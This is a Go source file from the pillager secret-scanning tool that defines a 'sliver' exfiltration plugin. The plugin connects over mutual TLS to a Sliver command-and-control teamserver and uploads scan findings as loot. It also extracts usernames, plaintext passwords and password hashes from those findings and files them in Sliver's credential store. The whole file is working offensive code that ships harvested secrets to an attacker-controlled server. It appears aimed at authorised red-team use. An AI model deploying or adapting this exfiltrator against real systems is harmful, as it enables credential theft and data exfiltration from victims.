package sliver

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"

	"github.com/bishopfox/sliver/client/assets"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/brittonhayes/pillager"
	"github.com/brittonhayes/pillager/pkg/exfil"
	"google.golang.org/grpc"
)

// SliverExfiltrator exfiltrates findings to Sliver C2 loot and credential stores.
type SliverExfiltrator struct {
	rpc        rpcpb.SliverRPCClient
	conn       *grpc.ClientConn
	config     *assets.ClientConfig
	lootName   string
	lootType   string
	parseCreds bool
}

// NewSliverExfiltrator creates a new Sliver exfiltrator.
func NewSliverExfiltrator(cfg exfil.Config) (*SliverExfiltrator, error) {
	if cfg.Sliver == nil {
		return nil, fmt.Errorf("sliver configuration is required")
	}

	if cfg.Sliver.ConfigPath == "" {
		return nil, fmt.Errorf("sliver config path is required")
	}

	configPath := expandPath(cfg.Sliver.ConfigPath)

	clientConfig, err := assets.ReadConfig(configPath)
	if err != nil {
		return nil, fmt.Errorf("failed to load Sliver config from %s: %w", configPath, err)
	}

	rpcClient, conn, err := transport.MTLSConnect(clientConfig)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to Sliver teamserver: %w", err)
	}

	lootName := "pillager-scan"
	if cfg.Sliver.LootName != nil && *cfg.Sliver.LootName != "" {
		lootName = *cfg.Sliver.LootName
	}

	lootType := "credentials"
	if cfg.Sliver.LootType != nil && *cfg.Sliver.LootType != "" {
		lootType = *cfg.Sliver.LootType
	}

	parseCreds := true
	if cfg.Sliver.ParseCredentials != nil {
		parseCreds = *cfg.Sliver.ParseCredentials
	}

	return &SliverExfiltrator{
		rpc:        rpcClient,
		conn:       conn,
		config:     clientConfig,
		lootName:   lootName,
		lootType:   lootType,
		parseCreds: parseCreds,
	}, nil
}

// Exfiltrate sends findings to Sliver's loot and credential stores.
func (s *SliverExfiltrator) Exfiltrate(ctx context.Context, findings []pillager.Finding) error {
	if len(findings) == 0 {
		return nil
	}

	if err := s.storeLoot(ctx, findings); err != nil {
		return fmt.Errorf("failed to store loot: %w", err)
	}

	if s.parseCreds {
		credentials := ExtractCredentials(findings)
		if len(credentials) > 0 {
			if err := s.storeCredentials(ctx, credentials); err != nil {
				return fmt.Errorf("failed to store credentials: %w", err)
			}
		}
	}

	return nil
}

func (s *SliverExfiltrator) storeLoot(ctx context.Context, findings []pillager.Finding) error {
	pkg := exfil.CreatePackage(findings)

	data, err := json.MarshalIndent(pkg, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to serialize findings: %w", err)
	}

	lootName := fmt.Sprintf("%s-%s.json", s.lootName, pkg.Metadata.Timestamp.Format("20060102-150405"))

	file := &commonpb.File{
		Name: lootName,
		Data: data,
	}

	// Parse loot type from configuration
	lootType := s.parseLootType()

	lootReq := &clientpb.Loot{
		Name:     lootName,
		Type:     lootType,
		FileType: clientpb.FileType_TEXT,
		File:     file,
	}

	_, err = s.rpc.LootAdd(ctx, lootReq)
	if err != nil {
		return fmt.Errorf("failed to add loot to Sliver: %w", err)
	}

	return nil
}

func (s *SliverExfiltrator) storeCredentials(ctx context.Context, credentials []Credential) error {
	for _, cred := range credentials {
		var credReq *clientpb.Credential

		if cred.Plaintext != "" {
			credReq = &clientpb.Credential{
				User:     cred.Username,
				Password: cred.Plaintext,
			}
		} else if cred.Hash != "" {
			credReq = &clientpb.Credential{
				User:     cred.Username,
				Password: fmt.Sprintf("[HASH:%s] %s", cred.HashType, cred.Hash),
			}
		} else {
			continue
		}

		credName := fmt.Sprintf("%s-%s", cred.Collection, cred.Username)

		lootReq := &clientpb.Loot{
			Name:           credName,
			Type:           clientpb.LootType_LOOT_CREDENTIAL,
			CredentialType: clientpb.CredentialType_USER_PASSWORD,
			Credential:     credReq,
		}

		_, err := s.rpc.LootAdd(ctx, lootReq)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Warning: failed to add credential to Sliver: %v\n", err)
		}
	}

	return nil
}

func (s *SliverExfiltrator) Close() error {
	if s.conn != nil {
		return s.conn.Close()
	}
	return nil
}

func (s *SliverExfiltrator) parseLootType() clientpb.LootType {
	switch s.lootType {
	case "file":
		return clientpb.LootType_LOOT_FILE
	case "credential", "credentials":
		return clientpb.LootType_LOOT_CREDENTIAL
	default:
		// Default to file type for findings data
		return clientpb.LootType_LOOT_FILE
	}
}

func expandPath(path string) string {
	if len(path) > 0 && path[0] == '~' {
		home, err := os.UserHomeDir()
		if err != nil {
			return path
		}
		return filepath.Join(home, path[1:])
	}
	return path
}

func init() {
	exfil.Register("sliver", func(cfg exfil.Config) (exfil.Exfiltrator, error) {
		return NewSliverExfiltrator(cfg)
	})
}
